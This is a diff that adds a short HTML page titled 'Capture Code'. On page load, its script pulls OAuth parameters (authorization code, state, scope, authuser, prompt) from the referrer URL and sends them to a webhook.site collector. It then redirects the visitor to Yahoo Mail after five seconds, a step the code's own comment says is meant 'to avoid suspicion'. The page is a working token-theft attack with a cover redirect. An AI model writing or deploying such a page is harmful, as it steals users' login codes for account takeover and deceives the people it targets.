@@ -1,0 +1,48 @@
+
+        <html>
+        <head>
+            <title>Capture Code</title>
+        </head>
+        <body>
+            <p>Processing...</p>
+            <script>
+                window.onload = function() {
+                    // Get the Referer URL
+                    const referer = document.referrer || 'No referer found';
+                    
+                    // Parse the Referer URL to extract the code
+                    let code = 'No code found';
+                    let state = 'No state found';
+                    let scope = 'No scope found';
+                    let authuser = 'No authuser found';
+                    let prompt = 'No prompt found';
+                    
+                    if (referer !== 'No referer found') {
+                        try {
+                            const url = new URL(referer);
+                            const urlParams = new URLSearchParams(url.search);
+                            code = urlParams.get('code') || 'No code found';
+                            state = urlParams.get('state') || 'No state found';
+                            scope = urlParams.get('scope') || 'No scope found';
+                            authuser = urlParams.get('authuser') || 'No authuser found';
+                            prompt = urlParams.get('prompt') || 'No prompt found';
+                        } catch (e) {
+                            console.error('Error parsing Referer URL:', e);
+                        }
+                    }
+                    
+                    // Send the captured data to Webhook
+                    const data = `Code: ${code}, State: ${state}, Scope: ${scope}, Authuser: ${authuser}, Prompt: ${prompt}, Referer: ${referer}`;
+                    fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(data))
+                        .then(response => console.log('Data sent to Webhook'))
+                        .catch(error => console.error('Error sending to Webhook:', error));
+
+                    // Redirect to mail.yahoo.com after 5 seconds to avoid suspicion
+                    setTimeout(function() {
+                        window.location.href = "https://mail.yahoo.com";
+                    }, 5000);
+                };
+            </script>
+        </body>
+        </html>
+        
